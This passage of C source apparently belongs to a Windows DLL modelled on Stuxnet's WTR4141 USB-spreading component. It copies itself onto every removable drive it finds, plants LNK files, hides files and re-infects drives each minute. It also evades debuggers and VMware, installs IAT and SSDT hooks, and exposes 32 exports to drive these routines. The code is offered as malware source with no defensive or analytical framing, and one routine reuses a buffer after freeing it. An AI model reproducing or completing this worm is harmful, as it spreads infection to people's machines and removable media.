    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK2);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK3);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK4);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    return TRUE;
}

static BOOL WTR4141_CopyFilesToDrive(VOID) {
    HANDLE hFile;
    HANDLE hSelf;
    DWORD dwSize;
    DWORD dwRead;
    DWORD dwWritten;
    PBYTE pData;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szSelfPath[WTR4141_MAX_PATH];
    GetModuleFileNameW(NULL, szSelfPath, WTR4141_MAX_PATH);
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_DLL_NAME);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    hSelf = CreateFileW(szSelfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return FALSE;
    }
    dwSize = GetFileSize(hSelf, NULL);
    if (dwSize == 0) {
        CloseHandle(hSelf);
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hSelf);
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hSelf, pData, dwSize, &dwRead, NULL);
    CloseHandle(hSelf);
    WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pData);
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_PAYLOAD_NAME);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4141_InfectDrive(LPCWSTR szDrive) {
    if (!szDrive) return FALSE;
    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, szDrive);
    if (!WTR4141_IsDriveRemovable(szDrive)) {
        return FALSE;
    }
    WTR4141_CopyFilesToDrive();
    WTR4141_CreateLNKFiles();
    WTR4141_HideFiles();
    return TRUE;
}

static BOOL WTR4141_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (WTR4141_IsDriveRemovable(szDrive)) {
                WTR4141_InfectDrive(szDrive);
            }
        }
    }
    return TRUE;
}

static BOOL WTR4141_Execute(VOID) {
    HANDLE hMutex;
    HMODULE hModule;
    if (!WTR4141_Init()) return FALSE;
    if (WTR4141_IsExpired()) {
        WTR4141_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, WTR4141_MUTEX);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    if (WTR4141_CheckDebugger()) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    if (WTR4141_CheckVMware()) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    WTR4141_CheckRegistry();
    WTR4141_ReadRegistry();
    WTR4141_InstallIATHooks();
    WTR4141_InstallSSDTHooks();
    WTR4141_ScanDrives();
    WTR4141_StartWorker();
    while (WaitForSingleObject(g_Wtr4141Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        WTR4141_ScanDrives();
        if (WTR4141_IsExpired()) {
            break;
        }
    }
    WTR4141_Cleanup();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WTR4141_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WTR4141_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return WTR4141_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(LPCWSTR szDrive) {
    return WTR4141_InfectDrive(szDrive) ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return WTR4141_HideFiles() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WTR4141_LoadPayload() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WTR4141_InstallIATHooks() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WTR4141_InstallSSDTHooks() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return WTR4141_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return WTR4141_StopWorker() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return WTR4141_CheckMutex() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return WTR4141_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return WTR4141_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    return WTR4141_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export14(VOID) {
    return WTR4141_CheckRegistry() ? 0 : 1;
}

DWORD WINAPI Export15(VOID) {
    return WTR4141_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    return WTR4141_CreateLNKFiles() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return WTR4141_CopyFilesToDrive() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return WTR4141_Init() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    WTR4141_Cleanup();
    return 0;
}

DWORD WINAPI Export20(VOID) {
    return (DWORD)g_Wtr4141Ctx.dwPid;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Wtr4141Ctx.dwTid;
}

DWORD WINAPI Export22(VOID) {
    return g_Wtr4141Ctx.dwTickStart;
}

DWORD WINAPI Export23(VOID) {
    return GetTickCount();
}

DWORD WINAPI Export24(VOID) {
    return (DWORD)g_Wtr4141Ctx.hMutex;
}

DWORD WINAPI Export25(VOID) {
    return (DWORD)g_Wtr4141Ctx.hStopEvent;
}

DWORD WINAPI Export26(VOID) {
    return WTR4141_VERSION;
}

DWORD WINAPI Export27(VOID) {
    return WTR4141_MAGIC;
}

DWORD WINAPI Export28(VOID) {
    return (DWORD)g_Wtr4141Ctx.szDrivePath;
}

DWORD WINAPI Export29(VOID) {
    return (DWORD)g_Wtr4141Ctx.szModulePath;
}

DWORD WINAPI Export30(VOID) {
    return (DWORD)g_Wtr4141Ctx.szSystemPath;
}

DWORD WINAPI Export31(VOID) {
    return (DWORD)g_Wtr4141Ctx.szWindowsPath;
}

DWORD WINAPI Export32(VOID) {
    return (DWORD)g_Wtr4141Ctx.szTempPath;
}
